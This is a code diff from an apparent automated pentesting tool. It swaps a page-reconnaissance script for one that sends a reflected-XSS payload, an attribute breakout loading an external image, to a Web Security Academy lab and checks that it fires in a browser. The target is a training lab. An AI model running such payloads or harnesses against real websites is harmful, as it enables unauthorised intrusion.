@@ -6,44 +6,26 @@ from typing import Dict, Optional
 import re
 import sys
 
+from pentest_bot.web_exploit.tools.browser_check import create_browser_check_xss
+
 if __name__ == "__main__":
     from pentest_bot.web_exploit.tools.interpreter import PythonInterpreter
-    import requests
 
-    interpreter = PythonInterpreter()
-    res = interpreter.run(r"""
-import requests, re, textwrap, bs4, html, sys, json, os, urllib.parse, pprint, itertools
+    browser_check_template, check_cb, target_url = create_browser_check_xss()
 
-base = 'https://0ad2009f0372bbba801612ed00a0008b.web-security-academy.net'
+    script = r"""
+import urllib.parse
 
-r = requests.get(base)
-print('Status:', r.status_code, 'length:', len(r.text))
+base = "https://0a1d004903fcd2d5808d2be0008800ee.web-security-academy.net/"
+# Break out of the quoted attribute and load our external image
+payload = '\">\x3Cimg src={target_url}>'
+attack_url = base + "?search=" + urllib.parse.quote(payload, safe="")
+print("[*] Testing attack URL:", attack_url)
 
-# show first 800 chars for context
-print('\n--- HEAD ---')
-print(r.text[:800])
+# Invoke the provided helper to trigger and verify the XSS
+browser_check_xss(url=attack_url)
+""".format(target_url=target_url)
 
-# parse forms
-soup = bs4.BeautifulSoup(r.text, 'html.parser')
-print('\n--- Forms ---')
-for i, form in enumerate(soup.find_all('form'), 1):
-    action = form.get('action')
-    method = form.get('method','GET').upper()
-    inputs = [(inp.get('name'), inp.get('type')) for inp in form.find_all('input')]
-    print(i, method, action, inputs)
-
-# grab all links containing query parameters
-print('\n--- Links with ? ---')
-for a in soup.find_all('a', href=True):
-    href = a['href']
-    if '?' in href:
-        print(href)
-
-""")
+    interpreter = PythonInterpreter(shared_globals=browser_check_template)
+    res = interpreter.run(script)
     print(res)
-
-    # real = requests.get("https://example.com")
-    # print(res)
-    # print("-"*100)
-    # print(real.text[:200])
-
